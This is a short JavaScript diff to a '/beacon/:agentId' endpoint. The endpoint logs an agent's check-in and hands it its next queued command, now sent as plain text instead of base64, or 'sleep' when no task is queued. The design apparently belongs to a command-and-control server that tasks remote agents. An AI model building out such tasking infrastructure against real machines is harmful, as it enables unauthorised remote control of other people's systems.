@@ -121,7 +121,7 @@ app.get('/beacon/:agentId', (req, res) => {
     agentStore.updateAgentBeaconTime(agentId)
     const task = taskStore.getNextTaskForAgent(agentId)
     if (task) {
-      res.status(200).send(`${task.id}||${Buffer.from(task.command).toString('base64')}`)
+      res.status(200).send(`${task.id}||${task.command}`)
     } else {
       res.status(200).send('sleep')
     }
